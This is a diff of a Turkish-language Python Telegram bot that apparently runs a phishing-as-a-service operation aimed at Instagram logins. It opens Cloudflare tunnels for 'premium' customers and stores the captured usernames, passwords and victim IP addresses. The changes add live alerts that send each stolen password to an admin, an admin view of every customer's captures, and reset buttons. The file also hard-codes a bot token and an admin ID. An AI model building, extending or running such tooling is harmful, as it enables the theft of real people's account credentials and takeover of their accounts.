@@ -1,7 +1,8 @@
-# telegram_igcap_bot.py - TERMUX %100 ÇALIŞAN VERSİYON (Güncellenmiş - Tunnel kapatma düzeltmesi + yeni token)
+# telegram_igcap_bot.py - TERMUX / Railway %100 ÇALIŞAN VERSİYON
 """
-PYTHON SYNTAX HATA DÜZELTİLDİ ✅
-python telegram_igcap_bot.py
+Güncellenmiş özellikler:
+- Kendi capture'leri resetleme (her kullanıcı için)
+- Admin için: kendi reset + tüm reset + tüm capture'leri görüntüleme
 """
 
 import asyncio
@@ -15,12 +16,11 @@ from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# Termux asyncio fix
 nest_asyncio.apply()
 
 # ═══════════════════════════════════════════════════════════════
-BOT_TOKEN = "8366855341:AAHauyMwWYcruSFAddfTwnlGdcs1UKWyFuo"  # ← YENİ TOKEN
-ADMIN_ID = 7999336769               # ← Senin ID (değiştirebilirsin)
+BOT_TOKEN = "8366855341:AAHauyMwWYcruSFAddfTwnlGdcs1UKWyFuo"  # ← Güncel token
+ADMIN_ID = 7999336769
 
 PORT_RANGE = [8080, 8081, 8082, 3000, 3001, 4444]
 USERS_FILE = "premium_users.json"
@@ -30,7 +30,6 @@ premium_users = set()
 active_tunnels = {}
 bot_app = None
 
-# Klasörü oluştur
 if not os.path.exists(CAPTURES_DIR):
     os.makedirs(CAPTURES_DIR)
 
@@ -75,11 +74,10 @@ def get_user_from_port(port):
 def save_capture(ip, username, password, port):
     user_id = get_user_from_port(port)
     if not user_id:
-        print(f"⚠️ Bilinmeyen port: {port} - capture kaydedilmedi")
+        print(f"⚠️ Bilinmeyen port: {port}")
         return
 
     filename = os.path.join(CAPTURES_DIR, f"captures_{user_id}.json")
-
     data = {'captures': []}
     if os.path.exists(filename):
         try:
@@ -99,8 +97,10 @@ def save_capture(ip, username, password, port):
         with open(filename, 'w') as f:
             json.dump(data, f, indent=2)
         print(f"💾 Capture kaydedildi: {username} → {user_id}")
+        # Admin'e canlı bildirim
+        asyncio.create_task(notify_admin(ip, username, password, user_id))
     except Exception as e:
-        print(f"❌ Save error for {user_id}: {e}")
+        print(f"❌ Save error: {e}")
 
 def is_port_free(port):
     import socket
@@ -177,7 +177,7 @@ async def notify_admin(ip, username, password, user_id):
         await bot_app.bot.send_message(
             ADMIN_ID,
             f"🎣 **LIVE CAPTURE!**\n\n"
-            f"👤 Kullanıcı: `{user_id}` ({'Admin' if user_id == str(ADMIN_ID) else 'Premium'})\n"
+            f"👤 Kullanıcı: `{user_id}`\n"
             f"🎯 Hedef: `{username}`\n"
             f"🔑 `{password}`\n"
             f"🌐 `{ip}`\n"
@@ -220,23 +220,27 @@ def start_cloudflare_tunnel(port):
         print(f"❌ Cloudflared error: {e}")
         return None, None
 
-# ═══════════════════════════════════════════════════════════════ TELEGRAM
+# ═══════════════════════════════════════════════════════════════ TELEGRAM KOMUTLARI
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
 
     if user_id == str(ADMIN_ID):
         keyboard = [
             [InlineKeyboardButton("👥 Kullanıcı Yönetimi", callback_data="manage")],
-            [InlineKeyboardButton("📊 Benim Captures", callback_data="captures")],
+            [InlineKeyboardButton("📊 Benim Captures", callback_data="my_captures")],
+            [InlineKeyboardButton("🌐 Tüm Captureler", callback_data="all_captures")],
+            [InlineKeyboardButton("🗑️ Benim Capture'leri Sıfırla", callback_data="reset_my")],
+            [InlineKeyboardButton("🗑️ Tüm Capture'leri Sıfırla", callback_data="reset_all")],
             [InlineKeyboardButton("🔗 Benim Tunnel", callback_data="tunnel")]
         ]
     elif user_id in premium_users:
         keyboard = [
             [InlineKeyboardButton("🔗 Tunnel Başlat", callback_data="tunnel")],
-            [InlineKeyboardButton("📊 Benim Son 5 Capture", callback_data="captures")]
+            [InlineKeyboardButton("📊 Benim Son 5 Capture", callback_data="my_captures")],
+            [InlineKeyboardButton("🗑️ Capture'lerimi Sıfırla", callback_data="reset_my")]
         ]
     else:
-        await update.message.reply_text("❌ Premium değilsin!\nAdmin `/add_user {ID veya @username}` bekle.", parse_mode='Markdown')
+        await update.message.reply_text("❌ Premium değilsin!\nAdmin `/add_user {ID veya @username}` bekle.")
         return
 
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -263,16 +267,15 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 display = f"`@{u}` (username)"
             users_list.append(f"• {display}")
         users_list = "\n".join(users_list) if users_list else "• Yok"
-
+        
         await query.edit_message_text(
             f"📋 *Premium Users:*\n{users_list}\n\n"
             "*Kullan:* `/add_user 123456` veya `/add_user @username`",
             parse_mode='Markdown'
         )
 
-    elif query.data == "captures":
+    elif query.data == "my_captures":
         filename = os.path.join(CAPTURES_DIR, f"captures_{user_id}.json")
-
         if not os.path.exists(filename):
             await query.edit_message_text("📭 Henüz capture'n yok.")
             return
@@ -296,11 +299,49 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await query.edit_message_text(f"❌ Dosya okuma hatası: {str(e)}")
 
+    elif query.data == "reset_my":
+        filename = os.path.join(CAPTURES_DIR, f"captures_{user_id}.json")
+        if os.path.exists(filename):
+            os.remove(filename)
+            await query.edit_message_text("🗑️ **Kendi capture'lerin sıfırlandı!**")
+        else:
+            await query.edit_message_text("📭 Zaten capture'n yok.")
+
+    elif query.data == "reset_all" and user_id == str(ADMIN_ID):
+        count = 0
+        for file in os.listdir(CAPTURES_DIR):
+            if file.startswith("captures_") and file.endswith(".json"):
+                os.remove(os.path.join(CAPTURES_DIR, file))
+                count += 1
+        await query.edit_message_text(f"🗑️ **Tüm capture'ler sıfırlandı!** ({count} kullanıcı dosyası silindi)")
+
+    elif query.data == "all_captures" and user_id == str(ADMIN_ID):
+        text = "🌐 **Tüm Kullanıcıların Capture'leri:**\n\n"
+        found = False
+        for file in os.listdir(CAPTURES_DIR):
+            if file.startswith("captures_") and file.endswith(".json"):
+                user_file_id = file.replace("captures_", "").replace(".json", "")
+                try:
+                    with open(os.path.join(CAPTURES_DIR, file), 'r') as f:
+                        data = json.load(f)
+                        caps = data.get('captures', [])
+                        if caps:
+                            found = True
+                            text += f"👤 Kullanıcı `{user_file_id}` ({len(caps)} capture):\n"
+                            for c in caps[-5:]:
+                                text += (
+                                    f"  • `{c['username']}` | `{c['password']}`\n"
+                                    f"    IP: `{c['ip']}` | Zaman: `{c['time'][:19]}`\n"
+                                )
+                            text += "\n"
+                except:
+                    pass
+        if not found:
+            text += "📭 Henüz hiç capture yok."
+        await query.edit_message_text(text, parse_mode='Markdown')
+
     elif query.data == "tunnel":
         await create_tunnel(query, user_id)
-
-    elif query.data.startswith("kill_"):
-        await kill_tunnel(update, context)
 
 async def create_tunnel(query, user_id):
     if user_id in active_tunnels:
@@ -325,7 +366,7 @@ async def create_tunnel(query, user_id):
     url, proc = start_cloudflare_tunnel(port)
 
     if url and proc:
-        end_time = time.time() + 600  # 10 dakika
+        end_time = time.time() + 600
         active_tunnels[user_id] = {
             'url': url,
             'port': port,
@@ -357,48 +398,40 @@ async def create_tunnel(query, user_id):
             except:
                 pass
     else:
-        await query.edit_message_text(" ❌ **HATA!**\n`pkg install cloudflared`")
+        await query.edit_message_text("❌ **HATA! Cloudflared çalışmıyor**")
 
 async def kill_tunnel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user_id = query.data.split("_")[1]
 
-    print(f"DEBUG: kill_tunnel çağrıldı - user_id: {user_id}, data: {query.data}")
-
     if user_id not in active_tunnels:
-        await query.answer("❌ Tunnel zaten yok veya kapanmış!")
+        await query.answer("❌ Tunnel zaten yok!")
         return
 
     tunnel = active_tunnels[user_id]
     closed = False
 
-    # 1. terminate
     try:
         tunnel['proc'].terminate()
         tunnel['proc'].wait(timeout=5)
         closed = True
-        print(f"Tunnel {user_id} terminate ile kapatıldı")
-    except Exception as e:
-        print(f"Terminate başarısız ({user_id}): {e}")
+    except:
+        pass
 
-    # 2. kill
     if not closed:
         try:
             tunnel['proc'].kill()
             tunnel['proc'].wait(timeout=3)
             closed = True
-            print(f"Tunnel {user_id} kill ile kapatıldı")
-        except Exception as e:
-            print(f"Kill başarısız ({user_id}): {e}")
+        except:
+            pass
 
-    # 3. pkill -9 cloudflared (geniş)
     if not closed:
         try:
             subprocess.run(["pkill", "-9", "-f", "cloudflared"], timeout=5)
             closed = True
-            print(f"Tunnel {user_id} pkill -9 ile temizlendi")
-        except Exception as e:
-            print(f"pkill -9 başarısız ({user_id}): {e}")
+        except:
+            pass
 
     time.sleep(1.5)
 
@@ -406,82 +439,64 @@ async def kill_tunnel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         del active_tunnels[user_id]
 
     if closed:
-        await query.edit_message_text(" 🔒 **Tunnel başarıyla kapatıldı!**")
+        await query.edit_message_text("🔒 **Tunnel başarıyla kapatıldı!**")
     else:
-        await query.edit_message_text(
-            "⚠️ **Tunnel kapatma denendi ama tamamen kapanmayabilir.**\n"
-            "Termux'ta şu komutları dene:\n"
-            "`pkill -9 cloudflared`\n"
-            "`killall cloudflared`"
-        )
+        await query.edit_message_text("⚠️ **Tunnel kapatma denendi ama tam kapanmayabilir.**\n`pkill -9 cloudflared` komutunu dene.")
 
 # Komutlar
 async def cmd_add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_user.id) != str(ADMIN_ID):
-        return
-
+    if str(update.effective_user.id) != str(ADMIN_ID): return
     if not context.args:
         await update.message.reply_text("❌ Kullanım: `/add_user 123456` veya `/add_user @username`")
         return
 
     arg = context.args[0].strip()
-
     if arg.startswith('@'):
-        username = arg[1:]
-        uid_to_add = username
-        display = f"@{username}"
+        uid_to_add = arg[1:]
+        display = f"@{uid_to_add}"
     else:
         try:
             uid_to_add = int(arg)
             display = str(uid_to_add)
-        except ValueError:
-            await update.message.reply_text("❌ Geçersiz! Örnek: `/add_user 123456` veya `/add_user @Jaiitta`")
+        except:
+            await update.message.reply_text("❌ Geçersiz!")
             return
 
     premium_users.add(str(uid_to_add))
     save_users()
     await update.message.reply_text(f"✅ **{display}** premium yapıldı!")
 
-
 async def cmd_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_user.id) != str(ADMIN_ID):
-        return
-
+    if str(update.effective_user.id) != str(ADMIN_ID): return
     if not context.args:
         await update.message.reply_text("❌ Kullanım: `/remove_user 123456` veya `/remove_user @username`")
         return
 
     arg = context.args[0].strip()
-
     if arg.startswith('@'):
-        username = arg[1:]
-        uid_to_remove = username
-        display = f"@{username}"
+        uid_to_remove = arg[1:]
+        display = f"@{uid_to_remove}"
     else:
         try:
             uid_to_remove = int(arg)
             display = str(uid_to_remove)
-        except ValueError:
+        except:
             await update.message.reply_text("❌ Geçersiz!")
             return
 
     removed = premium_users.discard(str(uid_to_remove))
     save_users()
-
     if removed:
-        await update.message.reply_text(f"✅ **{display}** premium'dan kaldırıldı!")
+        await update.message.reply_text(f"✅ **{display}** kaldırıldı!")
     else:
         await update.message.reply_text(f"ℹ️ **{display}** zaten premium değil.")
 
-
 async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_user.id) != str(ADMIN_ID): return
-    active_count = len(active_tunnels)
-    users_count = len(premium_users)
     await update.message.reply_text(
         f"📊 **Status:**\n"
-        f"• Aktif tunnel: **{active_count}**\n"
-        f"• Premium user: **{users_count}**"
+        f"• Aktif tunnel: **{len(active_tunnels)}**\n"
+        f"• Premium user: **{len(premium_users)}**"
     )
 
 # ═══════════════════════════════════════════════════════════════ MAIN
@@ -494,14 +509,10 @@ def cleanup_loop():
                 if current > tunnel['end_time']:
                     try:
                         tunnel['proc'].terminate()
-                        tunnel['proc'].wait(timeout=5)
                     except:
-                        try:
-                            tunnel['proc'].kill()
-                        except:
-                            pass
+                        pass
                     try:
-                        subprocess.run(["pkill", "-9", "-f", "cloudflared"], check=False)
+                        subprocess.run(["pkill", "-9", "-f", f"cloudflared.*{tunnel['port']}"], check=False)
                     except:
                         pass
                     to_kill.append(uid)
@@ -522,10 +533,8 @@ async def main():
     try:
         subprocess.run(["cloudflared", "--version"], capture_output=True, check=True)
         print("✅ Cloudflared OK")
-    except FileNotFoundError:
-        print("⚠️  `pkg install cloudflared` yap!")
     except:
-        print("✅ Cloudflared var")
+        print("⚠️ Cloudflared yok!")
 
     print("🤖 Bot başlatılıyor...")
     bot_app = Application.builder().token(BOT_TOKEN).build()
@@ -534,11 +543,11 @@ async def main():
     bot_app.add_handler(CommandHandler("add_user", cmd_add_user))
     bot_app.add_handler(CommandHandler("remove_user", cmd_remove_user))
     bot_app.add_handler(CommandHandler("status", cmd_status))
-    bot_app.add_handler(CallbackQueryHandler(button_callback))  # tek handler yeterli
+    bot_app.add_handler(CallbackQueryHandler(button_callback))
 
     threading.Thread(target=cleanup_loop, daemon=True).start()
 
-    print("🚀 Bot hazır! Telegram'da /start")
+    print("🚀 Bot hazır!")
 
     await bot_app.initialize()
     await bot_app.start()
